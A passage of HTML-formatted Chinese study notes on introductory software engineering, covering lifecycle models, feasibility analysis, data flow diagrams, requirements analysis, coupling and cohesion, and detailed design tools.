class="headerlink" title="(3)软件工程基本原理："></a>(3)软件工程基本原理：</h5><ul><li>按软件生存期分阶段制定计划并认真实施</li><li>坚持进行阶段评审</li><li>坚持严格的产品控制</li><li>使用现代程序设计技术</li><li>结果能够得到清楚的审查</li><li>用人少而精</li><li>承认不断改进软件工程实践的必要性</li></ul><h5 id="※-4-软件工程方法学："><a href="#※-4-软件工程方法学：" class="headerlink" title="※(4)软件工程方法学："></a>※(4)软件工程方法学：</h5><p>把在软件生命周期全过程中使用的<strong>一整套技术方法的集合</strong>称为方法学，也称为泛型。<br>软件工程方法学包括三个要素：<strong>方法、工具和过程</strong>。</p><p><strong>方法</strong>：完成软件开发各项任务的技术方法，回答“怎么做”<br><strong>工具</strong>：为运用方法提供的自动或半自动软件工程支撑环境<br><strong>过程</strong>：是为了获得高质量软件所需要完成的一系列任务框架，回答“何时做”</p><h5 id="5-软件工程方法学分类："><a href="#5-软件工程方法学分类：" class="headerlink" title="(5)软件工程方法学分类："></a>(5)软件工程方法学分类：</h5><p>传统方法学（生命周期方法学）</p><p>面向对象方法学：</p><h3 id="1-3-软件生命周期"><a href="#1-3-软件生命周期" class="headerlink" title="1.3 软件生命周期"></a>1.3 软件生命周期</h3><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221121155257150.png" alt="image-20221121155257150"></p><h3 id="1-4-软件过程"><a href="#1-4-软件过程" class="headerlink" title="1.4 软件过程"></a>1.4 软件过程</h3><p>软件过程：是为了获得高质量软件所需要完成的一系列任务框架。<br>通常用软件生命周期模型描述软件过程。</p><h4 id="瀑布模型"><a href="#瀑布模型" class="headerlink" title="瀑布模型"></a>瀑布模型</h4><p>将软件生命周期的各项活动规定为依照固定顺序连接的若干阶段工作，最终得到软件产品</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221121160058408.png" alt="image-20221121160058408"></p><p><strong>瀑布模型特点：</strong></p><ol><li>阶段间具有顺序性和依赖性。</li><li>推迟实现的观点。</li><li>质量保证的观点<ol><li>每个阶段必须完成规定的文档</li><li>每个阶段结束前完成文档审查</li><li>及早改正错误</li></ol></li></ol><p><strong>1、瀑布模型的优点</strong></p><p>(强迫开发人员使用规范的方法，严格规定了每个阶段必须提交的文档，要求每个阶段)<br>可以强迫开发人员采用规范的方法，<br>严格规定了每个阶段必须提交的文档：<br>要求每个阶段交出的所有产品都必须经过质量保证小组的仔细验证。</p><p><strong>2、瀑布模型的缺点</strong></p><p>在软件开发的初期阶段就要求做出正确、全面、完整的需求分析对许多应用软件来说是极其困难的。<br>在需求分析阶段，当需求确定后，无法及时验证需求是否正确、完整。<br>作为整体开发的瀑布模型，由于不支持产品的演化，缺乏灵活性，对开发过程中很难发现的错误，只有在最终产品运行时才能暴露出来，从而使软件产品难以维护。</p><p><strong>改进的瀑布模型</strong></p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221121160239486.png" alt="image-20221121160239486"></p><h4 id="快速原型模型"><a href="#快速原型模型" class="headerlink" title="快速原型模型"></a>快速原型模型</h4><p>快速建立可运行的程序，他完成的功能往往是最终产品功能的一个<strong>子集</strong></p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221121160356731.png" alt="image-20221121160356731"></p><p><strong>快速原型模型优缺点：</strong></p><p><strong>优点：</strong></p><p>1、开发的软件产品通常满足用户需求<br>2、软件产品开发基本是线性过程</p><p><strong>缺点：</strong></p><p>1、准确原型设计困难<br>2、原型理解可能不同<br>3、不利于开发人员创新</p><h4 id="增量模型"><a href="#增量模型" class="headerlink" title="增量模型"></a>增量模型</h4><p>先完成一个系统子集的开发，再按同样的开发步骤增加功能（系统子集），如此递增下去直至满足全部系统需求。</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221121160827817.png" alt="image-20221121160827817"></p><p><strong>增量模型优缺点：</strong></p><p><strong>优点：</strong></p><p>1、短时间内可提交完成部分功能<br>2、逐渐增加产品功能，用户适应产品快。</p><p><strong>缺点：</strong></p><p>1、增量构件划分以及集成困难。<br>2、容易退化为边做边改模型。</p><h4 id="螺旋模型"><a href="#螺旋模型" class="headerlink" title="螺旋模型"></a>螺旋模型</h4><p>在每个阶段之前都增加了风险分析过程的快速原型模型，看作增加了<strong>风险分析</strong>的<strong>快速原型模型</strong></p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221121161053021.png" alt="image-20221121161053021"></p><p><strong>螺旋模型优缺点</strong>：</p><p><strong>优点</strong>：</p><p>1、利于把软件质量作为软件开发目标。<br>2、减少测试<br>3、维护和开发不分开</p><p><strong>缺点</strong>：</p><p>1、风险估计困难</p><h4 id="喷泉模型"><a href="#喷泉模型" class="headerlink" title="喷泉模型"></a>喷泉模型</h4><p>典型的<strong>面向对象</strong>的软件过程模型，体现<strong>迭代</strong>和<strong>无缝</strong>的特性</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221121161336367.png" alt="image-20221121161336367"></p><h2 id="二、可行性研究"><a href="#二、可行性研究" class="headerlink" title="二、可行性研究"></a>二、可行性研究</h2><h3 id="2-1-可行性研究任务"><a href="#2-1-可行性研究任务" class="headerlink" title="2.1 可行性研究任务"></a>2.1 可行性研究任务</h3><p>(1)可行性研究自的：<br>用最小的代价在最小的时间内确定问题是否能够解决。(5%-10%)</p><p>(2)可行性研究实质：<br>系统分析和设计过程的大大压缩和简化，在较高层次上以较为抽象的方式进行系统的分析和设计过程。</p><p>(3)可行性研究过程：</p><p>1.分析和澄清问题定义。</p><p>2.导出系统的逻辑模型。(数据流图+数据字典)</p><p>3.根据逻辑模型探索若干种可供选择解法</p><p>4.研究每种解法可行性。</p><p><strong>经济可行性</strong>：经济效益是否大于开发成本<br><strong>技术可行性</strong>：现有技术能否实现<br><strong>操作可行性</strong>：系统操作方式是否可行<br><strong>其他可行性</strong>：法律、社会效益。</p><h3 id="2-2-可行性研究内容"><a href="#2-2-可行性研究内容" class="headerlink" title="2.2 可行性研究内容"></a>2.2 可行性研究内容</h3><p>(1)可行性研究步骤：</p><p>1.复查系统规模和目标。</p><p>对问题定义阶段初步确定的规模和目标进行肯定或改正，并列出对目标系统的约束和限制。</p><p>2.研究目前正在使用的系统。</p><p>了解现有系统能做什么，而不花费过多时间分析怎么实现这些功能。</p><p>3.导出新系统的高层逻辑模型。</p><p>现有物理系统 &gt;&gt;现有逻辑模型&gt;&gt;自标逻辑模型&gt;&gt;目标物理系统</p><p>4.进一步定义问题。</p><p>分析员和用户一起再次复查系统。前四个步骤构成一个循环。</p><p>5.导出和评价供选择的解法</p><p>技术角度排除不可行方案<br>操作可行性排除用户不能接受方案<br>经济可行估算成本和收益</p><p>6.推荐行动方针。</p><p>给出是否继续的结论</p><p>7.草拟开发计划。</p><p>制定进度表<br>开发人员、计算机资源分析<br>估计每阶段成本、下阶段详细分析，</p><p>8.书写文档提交审查。</p><h3 id="2-3-系统流程图"><a href="#2-3-系统流程图" class="headerlink" title="2.3 系统流程图"></a>2.3 系统流程图</h3><p>是一种描绘<strong>物理系统</strong>的图，用图符号以黑盒子形式描绘<strong>物理系统</strong>的各部件表达<strong>数据在系统各部件之间流动的情况</strong>。而不是对数据进行加工处理的控制过程。</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221121165543762.png" alt="image-20221121165543762"></p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124162911640.png" alt="image-20221124162911640"></p><h3 id="2-4-数据流图和数据字典（※）"><a href="#2-4-数据流图和数据字典（※）" class="headerlink" title="2.4 数据流图和数据字典（※）"></a>2.4 数据流图和数据字典（※）</h3><h4 id="数据流图-DFD"><a href="#数据流图-DFD" class="headerlink" title="数据流图(DFD)"></a>数据流图(DFD)</h4><p>描述<strong>信息流和数据</strong>从输入到输出过程所经受的变换。<em>没有任何具体物理部件</em>，只是描绘数据在软件中流动和被处理的<strong>逻辑过程</strong>。</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221121165648839.png" alt="image-20221121165648839"></p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124173610683.png" alt="image-20221124173610683"></p><p>数据流图画法：<br>(1)确定系统输入输出、源点以及终点</p><p>(2)画系统顶层数据流图</p><p>用加将输入输出数据连接起来，给加工、数据等命名</p><p>(3)自顶向下分解，画出分层数据流图</p><p>将加工细分，细分成几个数据流图表示</p><h4 id="数据字典"><a href="#数据字典" class="headerlink" title="数据字典"></a>数据字典</h4><p>是关于数据的信息集合，即对数据流图中包含的所有元素定义的集合。</p><p>1.数据字典的内容：数据流、数据流分量(数据元素)、数据存储、处理。</p><p>2.定义数据的方法：</p><p>由数据元素组成数据的方式：顺序、选择、重复、可选</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221121170418723.png" alt="image-20221121170418723"></p><p><strong>例题：</strong></p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221121170747737.png" alt="image-20221121170747737"></p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221121170812436.png" alt="image-20221121170812436"></p><p><strong>数据字典用途：</strong></p><p>在软件分析和设计的过程中给人提供关于数据的描述信息。</p><ol><li>作为分析阶段的工具</li><li>估计改变一个数据将产生的影响</li><li>是数据库开发的第一步</li></ol><h3 id="2-5-成本效益分析"><a href="#2-5-成本效益分析" class="headerlink" title="2.5 成本效益分析"></a>2.5 成本效益分析</h3><h5 id="一、分析目的"><a href="#一、分析目的" class="headerlink" title="一、分析目的"></a>一、分析目的</h5><p>从经济角度分析新系统的开发是否能盈利，帮助使用部门正确做出是否投资的决定。</p><h5 id="二、成本估计"><a href="#二、成本估计" class="headerlink" title="二、成本估计"></a>二、成本估计</h5><p><strong>1.代码行技术</strong><br>软件成本 &#x3D; 每行代码的平均成本 * 源代码行数</p><p><strong>2.任务分解技术</strong>：按开发阶段将系统划分成任务</p><p>每个任务的成本 &#x3D; 人力 * 人平均工资</p><p>软件成本 &#x3D; ∑独立任务的成本</p><h5 id="三、成本-x2F-效益分析步骤"><a href="#三、成本-x2F-效益分析步骤" class="headerlink" title="三、成本&#x2F;效益分析步骤"></a>三、成本&#x2F;效益分析步骤</h5><p>1.估计开发成本、运行费用和新系统带来的经济效益。</p><p>2.比较新系统的开发成本和经济效益。</p><h5 id="四、成本-x2F-效益分析的方法"><a href="#四、成本-x2F-效益分析的方法" class="headerlink" title="四、成本&#x2F;效益分析的方法"></a>四、成本&#x2F;效益分析的方法</h5><p>1.货币的时间价值F&#x3D;P(1+i)</p><p>2.投资回收期</p><p>3.纯收入</p><p>4.投资回收率</p><h2 id="三、需求分析"><a href="#三、需求分析" class="headerlink" title="三、需求分析"></a>三、需求分析</h2><h3 id="3-1-需求分析任务"><a href="#3-1-需求分析任务" class="headerlink" title="3.1 需求分析任务"></a>3.1 需求分析任务</h3><h4 id="需求分析任务"><a href="#需求分析任务" class="headerlink" title="需求分析任务"></a>需求分析任务</h4><ul><li>确定对系统的综合要求<ul><li><strong>功能需求</strong>：系统必须提供的服务功能</li><li><strong>性能需求</strong>：系统必须满足的约束条件<br>(响应速度、安全性)</li><li><strong>可靠性和可用性需求</strong>：可靠性定量、可用性量化</li><li><strong>出错处理需求</strong>：错误响应机制</li><li><strong>接口需求</strong>：应用系统与环境通信格式常见用户接口需不硬件接口需求、软件接口需求、通信接口需求约束：用户或环境强加的限制条件（工具、语言等）</li><li><strong>逆向需求</strong>：系统不应该做什么</li><li><strong>将来可能提出要求</strong>：将来可能需要实现的需求</li></ul></li><li>分析系统的数据要求</li><li>导出系统的逻辑模型</li><li>修正系统开发计划</li></ul><h3 id="3-2-与用户沟通获得需求方法"><a href="#3-2-与用户沟通获得需求方法" class="headerlink" title="3.2 与用户沟通获得需求方法"></a>3.2 与用户沟通获得需求方法</h3><p>访谈</p><p>面向数据流自顶向下求精</p><p>简易的应用规格说明技术</p><p>快速建立软件原型</p><h3 id="3-3-分析建模与规格说明"><a href="#3-3-分析建模与规格说明" class="headerlink" title="3.3 分析建模与规格说明"></a>3.3 分析建模与规格说明</h3><p><strong>模型</strong>：</p><p>是指为了理解事物而对事物做出的一种抽象，是对事物的一种无歧义的书面描述。</p><h4 id="模型分类："><a href="#模型分类：" class="headerlink" title="模型分类："></a>模型分类：</h4><ul><li><strong>数据模型</strong>：（实体-联系图）：描绘数据对象及数据对象之间的关系。</li><li><strong>功能模型</strong>：(数据流图)：描绘数据在系统中流动时被处理的逻辑过程，指明系统具有的变换数据的功能。</li><li><strong>行为模型</strong>：（状态转换图）：描绘系统的各种行为模式在不同状态间转换的方式。</li></ul><h3 id="3-4-实体联系图、状态转换图"><a href="#3-4-实体联系图、状态转换图" class="headerlink" title="3.4 实体联系图、状态转换图"></a>3.4 实体联系图、状态转换图</h3><h4 id="一、实体联系图（E-R图）"><a href="#一、实体联系图（E-R图）" class="headerlink" title="一、实体联系图（E-R图）"></a>一、实体联系图（E-R图）</h4><ul><li><strong>实体</strong>：描述数据对象</li><li><strong>属性</strong>：描述数据对象的性质</li><li><strong>联系</strong>：描述数据对象之间的交互方式<ul><li>一对一联系1：1</li><li>一对多联系1：n</li><li>多对多联系n：m</li></ul></li><li><strong>表示方式</strong><ul><li><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124093810762.png" alt="image-20221124093810762"></li></ul></li></ul><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124094141288.png" alt="image-20221124094141288"></p><h4 id="二、状态转换图"><a href="#二、状态转换图" class="headerlink" title="二、状态转换图"></a>二、状态转换图</h4><ul><li><strong>状态</strong>：系统的行为模式，包括初态，终态，中间状态</li><li><strong>事件</strong>：是指在某个特定时刻发生的事情，即对系统从一个状态转换到另一个状态的事件抽象</li><li><strong>表示方式</strong><ul><li><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124094428104.png" alt="image-20221124094428104"></li></ul></li></ul><p><strong><font color=RED>在一张状态图中只能有<u>一个初态</u>，而<u>终态可以有0至多个</u></font></strong></p><h3 id="3-5-其他图形工具"><a href="#3-5-其他图形工具" class="headerlink" title="3.5 其他图形工具"></a>3.5 其他图形工具</h3><h4 id="一、层次方框图"><a href="#一、层次方框图" class="headerlink" title="一、层次方框图"></a>一、层次方框图</h4><p><strong>表示方式</strong>：用<strong>树形结构</strong>的一系列矩形框描述<strong>数据</strong>的<strong>层次结构</strong></p><p><strong>优点</strong>：随着结构的逐步精细，对数据结构的描绘也越来越详细</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124095028532.png" alt="image-20221124095028532"></p><h4 id="二、Warnier图"><a href="#二、Warnier图" class="headerlink" title="二、Warnier图"></a>二、Warnier图</h4><p><strong>表示方法</strong>：用树形结构描绘<strong>信息</strong>的层次结构</p><p><strong>优点</strong>：可以表明信息的逻辑组织。可以表明某类信息出现的条件或是否重复出现</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124095231688.png" alt="image-20221124095231688"></p><h4 id="三、IPO图"><a href="#三、IPO图" class="headerlink" title="三、IPO图"></a>三、IPO图</h4><p><strong>表示方式</strong>：是<strong>输入</strong>、<strong>处理</strong>、<strong>输出</strong>图的简称，能够方便的描绘输入数据，对数据的处理和输出数据之间的关系</p><p><strong>优点</strong>：简略描绘系统主要算法</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124095505818.png" alt="image-20221124095505818"></p><h3 id="3-6-验证软件需求"><a href="#3-6-验证软件需求" class="headerlink" title="3.6 验证软件需求"></a>3.6 验证软件需求</h3><h5 id="一、从哪些方面验证软件需求的正确性"><a href="#一、从哪些方面验证软件需求的正确性" class="headerlink" title="一、从哪些方面验证软件需求的正确性"></a>一、从哪些方面验证软件需求的正确性</h5><ul><li><strong>一致性</strong>：所有需求必须是一致的，任何一条需求不能和其他需求互相矛盾。</li><li><strong>完整性</strong>：需求必须是完整的，规格说明书应该包括用户需要的每一个功能或性能。</li><li><strong>现实性</strong>：指定的需求应该能用现有的硬件和软件技术可以实现。</li><li><strong>有效性</strong>：必须证明需求是正确有效的，确实能解决用户面对的问题。</li></ul><h5 id="二、验证软件需求的方法"><a href="#二、验证软件需求的方法" class="headerlink" title="二、验证软件需求的方法"></a>二、验证软件需求的方法</h5><p>验证需求的一致性：自然语言描述需求、形式化语言描述需求、用软件工具验证</p><p>验证需求的现实性：参照开发经验</p><p>验证需求的完整性和有效性：建立软件原型</p><h5 id="三、用于需求分析的软件工具"><a href="#三、用于需求分析的软件工具" class="headerlink" title="三、用于需求分析的软件工具"></a>三、用于需求分析的软件工具</h5><p>PSL&#x2F;PSA(问题陈述语言&#x2F;问题陈述分析程序)系统</p><h2 id="四、总体设计"><a href="#四、总体设计" class="headerlink" title="四、总体设计"></a>四、总体设计</h2><h3 id="4-1-总体设计设计过程"><a href="#4-1-总体设计设计过程" class="headerlink" title="4.1 总体设计设计过程"></a>4.1 总体设计设计过程</h3><p>总体设计又称为概要设计或初步设计</p><p>任务：</p><ul><li>确定系统中每个程序由哪些模块组成以及这些模块相互间的关系。</li><li>划分出物理元素。包括程序、文件、数据库、文档等。</li></ul><p><strong>设计过程</strong>包括<strong>系统设计阶段</strong>和<strong>结构设计阶段</strong></p><ul><li>系统设计阶段<ul><li>设想供选择的方案：数据流图出发，将处理分组，抛弃行不通分组。</li><li>选取合理的方案：上一步方案选取低、中、高成本三种方案。</li><li>推荐最佳方案：推荐最佳方案，制定详细实现计划</li></ul></li><li>结构设计阶段<ul><li>功能分解：对数据流图进一步细化，进行功能分解。可以用IPO图等工具描述细化后每个处理的算法。</li><li>设计软件结构：层次图或结构图描绘软件结构。或数据流图导出软件结构。</li><li>设计数据库</li><li>定测试计划</li><li>书写文档</li><li>审查和复审</li></ul></li></ul><h3 id="4-2-设计原理（※）"><a href="#4-2-设计原理（※）" class="headerlink" title="4.2 设计原理（※）"></a>4.2 设计原理（※）</h3><h5 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a><strong>模块化</strong></h5><p>模块：能够单独命名，由边界元素限定的程序元素的序列，是构成程序的基本构件</p><p>模块化：把程序划分成独立命名且可独立访问的模块，每个模块完成一个子功能，把这些模块集成起来构成一个整体，可以完成指定的功能满足用户的需求。</p><h5 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h5><p>抽出事务的本质特性而暂时不考虑它们的细节</p><h5 id="逐步求精"><a href="#逐步求精" class="headerlink" title="逐步求精"></a>逐步求精</h5><p>逐步揭露出底层细节</p><p>Miller法则：注意力集中在(7±2)上</p><h5 id="信息隐藏与局部化"><a href="#信息隐藏与局部化" class="headerlink" title="信息隐藏与局部化"></a>信息隐藏与局部化</h5><p>信息隐藏：是指一个模块内包含的信息对于<strong>不需要这些信息的模块来说，是不能访问的</strong>。主要是指模块的实现细节。</p><p>局部化：指把一些关系密切的软件元素<strong>物理地</strong>放的彼此靠近，它有助于实现信息隐藏。</p><h5 id="模块独立"><a href="#模块独立" class="headerlink" title="模块独立"></a>模块独立</h5><p>模块独立性：是模块化、抽象、信息隐藏和局部化概念的直接结果。</p><p>模块独立是好设计的关键，设计是决定软件质量的关键环节。</p><p>度量标准：<font color=RED><strong>耦合，内聚</strong></font></p><h5 id="耦合"><a href="#耦合" class="headerlink" title="耦合"></a>耦合</h5><p>是对一个软件结构内<strong>不同模块之间</strong>互连程序的度量</p><p>耦合程度取决于模块接口的复杂程度、通过接口的数据等</p><p><font color=RED><strong>耦合性越高，模块独立性越弱</strong></font></p><p><strong>耦合分类（程度从低-&gt;高）</strong></p><p><font color=RED><strong>无直接耦合-&gt;数据耦合-&gt;标记耦合（特征耦合）-&gt;控制耦合-&gt;外部耦合-&gt;公共耦合-&gt;内容耦合</strong></font></p><h5 id="内聚"><a href="#内聚" class="headerlink" title="内聚"></a>内聚</h5><p>用来度量一个<strong>模块内部</strong>各个元素彼此结合的紧密程度</p><p><strong>内聚分类（程度从低-&gt;高）</strong></p><p><font color=RED><strong>偶然内聚-&gt;逻辑内聚-&gt;时间内聚-&gt;过程内聚-&gt;通信内聚-&gt;顺序内聚-&gt;功能内聚</strong></font></p><p>同其他模块强耦合的模块意味着弱内聚；强内聚模块意味着与其它模块间弱耦合；</p><p><font color=RED><strong>软件设计目标：高内聚、低耦合</strong></font></p><h3 id="4-3-启发规则"><a href="#4-3-启发规则" class="headerlink" title="4.3 启发规则"></a>4.3 启发规则</h3><ul><li>改进软件结构，提高模块独立性</li><li>模块规模应该适中</li><li>深度、宽度、扇入和扇出应适当<ul><li><strong>深度</strong>：表示软件结构中控制的层数</li><li><strong>宽度</strong>：软件结构内同一个层次上的模块总数的最大值</li><li><strong>扇出</strong>：一个模块直接控制（调用）的模块数目，扇出过大意味着模块过分复杂。一般一个设计的好的典型系统的<strong>平均扇出是3或4，扇出的上限是5到9。</strong></li><li><strong>扇入</strong>：指有多少上级模块调用它，扇入大说明上级模块共享该模块的数目多。好的软件结构<font color=RED>顶层扇出比较高，中层扇出比较少</font>，底层扇入到公共的实用模块中，即<font color=RED>底层模块有高扇入</font>。</li></ul></li><li>模块的作用域应该在控域之内<ul><li>作用域：指受该模块内一个判定影响的所有模块的集合。</li><li>控制域：是这个模块本身以及所有直接或间接从属于它的模块的集合。</li></ul></li><li>力争降低模块接口的复杂程度</li><li>设计单入口单出口的模块</li><li>模块功能应该可以预测</li></ul><h3 id="4-4-描绘软件结构的图形工具"><a href="#4-4-描绘软件结构的图形工具" class="headerlink" title="4.4 描绘软件结构的图形工具"></a>4.4 描绘软件结构的图形工具</h3><h5 id="一、层次图与IPO图"><a href="#一、层次图与IPO图" class="headerlink" title="一、层次图与IPO图"></a>一、层次图与IPO图</h5><p>层次图：用方框和连线表示，连线表示上下层的<strong>调用关系</strong></p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124111403816.png" alt="image-20221124111403816"></p><p>HIPO图：层次图加编号</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124111707271.png" alt="image-20221124111707271"></p><h5 id="二、结构图"><a href="#二、结构图" class="headerlink" title="二、结构图"></a>二、结构图</h5><p>不仅描述调用关系，还描述传递的信息和调用方式</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124111835714.png" alt="image-20221124111835714"></p><p>箭头代表调用过程传递的信息。尾部空心代表<strong>数据</strong>，实心代表<strong>控制信息</strong></p><p>模块调用分类</p><p>1、简单调用   2、循环调用    3、选择调用</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124112122632.png" alt="image-20221124112122632"></p><h3 id="4-5-面向数据流设计方法"><a href="#4-5-面向数据流设计方法" class="headerlink" title="4.5 面向数据流设计方法"></a>4.5 面向数据流设计方法</h3><p>面向数据流设计方法也成为结构化设计方法（SD）</p><p>数据流图分类</p><ol><li>交换流：由输入、变换中心和输出三部分组成<br><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124112323013.png" alt="image-20221124112323013"></li><li>事务流：在多种事务中选择一个执行<br><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124112352765.png" alt="image-20221124112352765"></li></ol><p>变换分析：把具有变换流特点的数据流图映射成软件结构</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124112531373.png" alt="image-20221124112531373"></p><h2 id="五、详细设计"><a href="#五、详细设计" class="headerlink" title="五、详细设计"></a>五、详细设计</h2><h3 id="5-1-详细设计的目的任务"><a href="#5-1-详细设计的目的任务" class="headerlink" title="5.1 详细设计的目的任务"></a>5.1 详细设计的目的任务</h3><ol><li>详细设计目的：确定怎样具体的是实现所要求的系统，得出对目标的精确描述</li><li>详细设计任务：<ol><li>过程设计：即设计软件体系结构中所包含的每个模块的实现算法</li><li>数据设计：设计软件数据结构</li><li>接口设计：设计软件内部各模块之间的接口</li></ol></li></ol><h3 id="5-2-结构程序设计"><a href="#5-2-结构程序设计" class="headerlink" title="5.2 结构程序设计"></a>5.2 结构程序设计</h3><p>结构程序设计：只用三种基本的控制结构就能实现任何<strong>单入口单出口</strong>的程序</p><p><strong>三种基本控制结构</strong>：选择、顺序、循环</p><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124113155501.png" alt="image-20221124113155501"></p><p>扩充的控制结构：</p><ul><li><p><strong>经典</strong>的结构程序设计：<br>只包括三种基本结构。</p></li><li><p><strong>扩展</strong>的结构程序设计：</p><p>除了基本控制结构还包括</p><p>Do-case多分支和Do-UNTIL循环。</p></li><li><p><strong>修正</strong>的结构程序设计：</p><p>除了基本控制结构和扩展控制结构还使用BREAK结构。</p></li></ul><p><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124113608802.png" alt="image-20221124113608802"></p><h3 id="5-3-人机界面设计"><a href="#5-3-人机界面设计" class="headerlink" title="5.3 人机界面设计"></a>5.3 人机界面设计</h3><p>人机界面设计：是接口设计的一个重要的组成部分。</p><p>设计人机界面过程常遇到的4个问题：</p><ul><li><strong>系统响应时间</strong>：重要属性：<strong>长度</strong>和<strong>易变性</strong></li><li><strong>用户帮助设施</strong></li><li><strong>出错信息处理</strong></li><li><strong>命令交互</strong></li></ul><p>人机界面设计指南：</p><ul><li>一般交互指南</li><li>信息显示指南</li><li>数据输入指南</li></ul><h3 id="5-4-过程设计工具（※）"><a href="#5-4-过程设计工具（※）" class="headerlink" title="5.4 过程设计工具（※）"></a>5.4 过程设计工具（※）</h3><p>过程设计工具：描述程序处理过程的工具。</p><ul><li><h5 id="程序流程图"><a href="#程序流程图" class="headerlink" title="程序流程图"></a>程序流程图</h5><ul><li>又称为程序框图，它是历史最悠久使用最广泛的描述软件设计的方法，然而它也是用得最混乱的一种方法。</li><li><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124114101379.png" alt="image-20221124114101379"></li></ul></li><li><h5 id="盒图-N-S图"><a href="#盒图-N-S图" class="headerlink" title="盒图(N-S图)"></a>盒图(N-S图)</h5><ul><li>出于要有一种不允许违背结构程序设计精神的图形工具的考虑。</li><li><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124114206775.png" alt="image-20221124114206775"></li></ul></li><li><h5 id="PAD图"><a href="#PAD图" class="headerlink" title="PAD图"></a>PAD图</h5><p>Problem Analysis Diagram</p><ul><li>他用二维树形结构的图来表示程序的控制流，将这种图翻译成程序代码比较容易</li><li><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124114901511.png" alt="image-20221124114901511"></li><li><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124164750465.png" alt="image-20221124164750465"></li><li>能够体现<strong>程序逻辑</strong>和<strong>数据结构</strong>，面向高级程序设计语言</li></ul></li><li><h5 id="判定表"><a href="#判定表" class="headerlink" title="判定表"></a>判定表</h5><ul><li>当<strong>算法中包含多重嵌套的条件选择</strong>时判定表却能够清晰地表示复杂的条件组合与应做的动作之间的对应关系。</li><li>组成：<br>左上部列出所有条件，左下部是所有可能的动作。<br>右上部是表示各种条件组合，右下部是和每种条件组合相对应的动作。</li><li><img src="/../pic/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E5%AF%BC%E8%AE%BA.assets/image-20221124165055113.png" alt="image-20221124165055113"></li></ul></li><li><h5 id="判定树"><a href="#判定树" class="headerlink" 